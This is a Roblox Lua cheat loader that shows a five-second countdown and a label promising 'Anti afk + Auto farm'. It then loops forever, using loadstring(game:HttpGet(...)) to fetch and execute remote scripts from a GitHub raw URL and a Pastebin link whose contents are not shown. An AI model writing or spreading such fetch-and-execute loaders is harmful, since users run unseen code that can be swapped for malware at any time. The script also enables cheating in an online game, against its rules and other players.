local ScreenGui = Instance.new("ScreenGui")
local L1 = Instance.new("TextLabel")
local L2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

L1.Name = "L1"
L1.Parent = ScreenGui
L1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
L1.BackgroundTransparency = 1.000
L1.Position = UDim2.new(0.348437488, 0, 0.475925893, 0)
L1.Size = UDim2.new(0, 582, 0, 50)
L1.Font = Enum.Font.SourceSansBold
L1.Text = "(5)"
L1.TextColor3 = Color3.fromRGB(255, 128, 0)
L1.TextScaled = true
L1.TextSize = 14.000
L1.TextWrapped = true

L2.Name = "L2"
L2.Parent = ScreenGui
L2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
L2.BackgroundTransparency = 1.000
L2.Position = UDim2.new(0.193229169, 0, 0.427777737, 0)
L2.Size = UDim2.new(0, 1177, 0, 52)
L2.Font = Enum.Font.GothamBlack
L2.Text = "Wait 5 seconds to use the cheat. This cheat is active until you leave. Anti afk + Auto farm."
L2.TextColor3 = Color3.fromRGB(255, 255, 255)
L2.TextScaled = true
L2.TextSize = 14.000
L2.TextWrapped = true

-- Scripts:

local function DQUILP_fake_script() -- L1.LocalScript 
	local script = Instance.new('LocalScript', L1)

	wait()
	script.Parent.Parent.L1.Text = ("(5)")
	wait(1)
	script.Parent.Parent.L1.Text = ("(4)")
	wait(1)
	script.Parent.Parent.L1.Text = ("(3)")
	wait(1)
	script.Parent.Parent.L1.Text = ("(2)")
	wait(1)
	script.Parent.Parent.L1.Text = ("(1)")
	wait(1)
	script.Parent.Parent.L1.Text = ("(0)")
	wait(1)
	script.Parent.Parent.L1.Text = ("Fully executed!")
	wait(0)
	script.Parent.Parent.L1.Visible = false
	script.Parent.Parent.L2.Visible = false
	
	while true do
		assert(getrawmetatable, "Your exploit does not support getrawmetatable")
		assert(getconnections, "Your exploit does not support getconnections")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Introvert1337/Releases/master/bloxburghairfarm.lua"))()
		wait()
		loadstring(game:HttpGet("https://pastebin.com/raw/SZkHcmKR"))()
	end
end
coroutine.wrap(DQUILP_fake_script)()
